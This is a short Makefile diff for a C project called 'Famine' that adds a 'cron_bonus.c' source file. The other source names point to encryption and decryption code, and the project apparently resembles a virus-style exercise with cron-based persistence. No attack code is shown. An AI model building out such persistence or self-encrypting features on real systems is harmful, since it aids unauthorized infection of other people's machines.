@@ -1,11 +1,11 @@
 NAME 		= Famine
 SRCS 		= famine.c \
 				parse_utils.c read_file_utils.c g_decryptor.c \
-				encrypt_func.c
+				encrypt_func.c cron_bonus.c
 
 BSRCS 		= famine.c \
 				parse_utils.c read_file_utils_bonus.c g_decryptor.c \
-				encrypt_func.c
+				encrypt_func.c cron_bonus.c
 
 OBJS		= $(SRCS:.c=.o)
 BOBJS		= $(BSRCS:.c=.o)
